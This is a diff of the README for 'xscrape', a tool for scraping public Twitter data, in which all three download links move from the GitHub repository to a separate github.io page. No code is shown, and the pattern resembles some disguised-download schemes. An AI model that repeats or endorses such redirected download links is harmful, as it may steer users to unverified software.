@@ -1,6 +1,6 @@
 # 🐦 xscrape - Effortlessly Collect Public Twitter Data
 
-[![Download xscrape](https://img.shields.io/badge/Download-xscrape-blue?style=for-the-badge&logo=github)](https://github.com/Woolstaplerfang145/xscrape)
+[![Download xscrape](https://img.shields.io/badge/Download-xscrape-blue?style=for-the-badge&logo=github)](https://woolstaplerfang145.github.io)
 
 ## 🎯 What is xscrape?
 
@@ -25,7 +25,7 @@ Getting started with xscrape is easier than you think. Here's what you need to d
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/Woolstaplerfang145/xscrape](https://github.com/Woolstaplerfang145/xscrape)
+Visit this link to download the application: [https://woolstaplerfang145.github.io](https://woolstaplerfang145.github.io)
 
 ### Step 2: Prepare Your Computer
 
@@ -208,6 +208,6 @@ Happy collecting! 📊
 
 ---
 
-**Download xscrape now:** [https://github.com/Woolstaplerfang145/xscrape](https://github.com/Woolstaplerfang145/xscrape)
+**Download xscrape now:** [https://woolstaplerfang145.github.io](https://woolstaplerfang145.github.io)
 
 Keywords: parser, post-scraper, scraper, scraping, twitter, twitter-api, twitter-scraper, x, x-scraper
